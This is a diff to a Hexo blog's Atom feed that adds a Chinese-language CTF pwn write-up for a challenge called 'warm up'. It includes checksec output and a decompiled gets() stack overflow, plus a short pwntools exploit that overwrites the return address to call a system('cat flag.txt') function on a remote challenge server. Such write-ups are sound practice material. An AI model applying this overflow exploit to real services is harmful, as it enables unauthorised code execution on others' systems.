@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-07-27T10:50:32.062Z</updated>
+  <updated>2019-07-27T11:01:02.587Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>warm up</title>
+    <link href="http://yoursite.com/2019/07/27/warmup/"/>
+    <id>http://yoursite.com/2019/07/27/warmup/</id>
+    <published>2019-07-27T10:52:55.882Z</published>
+    <updated>2019-07-27T11:01:02.587Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec warmup</span><br><span class="line"></span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/warmup'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">只开启了nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+0h] [rbp-80h]</span><br><span class="line">  char v5; // [rsp+40h] [rbp-40h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"-Warm Up-\n"</span>, 0xAuLL);</span><br><span class="line">  write(1, <span class="string">"WOW:"</span>, 4uLL);</span><br><span class="line">  sprintf(&amp;s, <span class="string">"%p\n"</span>, sub_40060D);</span><br><span class="line">  write(1, &amp;s, 9uLL);</span><br><span class="line">  write(1, <span class="string">"&gt;"</span>, 1uLL);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;v5, <span class="string">"&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gets(&amp;v5, <span class="string">"&gt;"</span>);  栈溢出漏洞利用</span><br><span class="line"></span><br><span class="line">int sub_40060D()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system函数</span><br><span class="line"></span><br><span class="line">-0000000000000040 var_40          db ?</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C                 db ? ; undefined</span><br><span class="line">-000000000000003B                 db ? ; undefined</span><br><span class="line">-000000000000003A                 db ? ; undefined</span><br><span class="line">-0000000000000039                 db ? ; undefined</span><br><span class="line">-0000000000000038                 db ? ; undefined</span><br><span class="line">-0000000000000037                 db ? ; undefined</span><br><span class="line">-0000000000000036                 db ? ; undefined</span><br><span class="line">-0000000000000035                 db ? ; undefined</span><br><span class="line">-0000000000000034                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line"></span><br><span class="line">覆盖v5只需要0x48个字节就可以了</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用栈溢出覆盖gets中的v5，写入system函数的地址即可</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">非常简单的64位栈溢出</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,41315)</span><br><span class="line">sys_addr = 0x000000000040060D</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*0x40+<span class="string">'a'</span>*8+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
+      
+    
+    </summary>
+    
+      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>dice game</title>
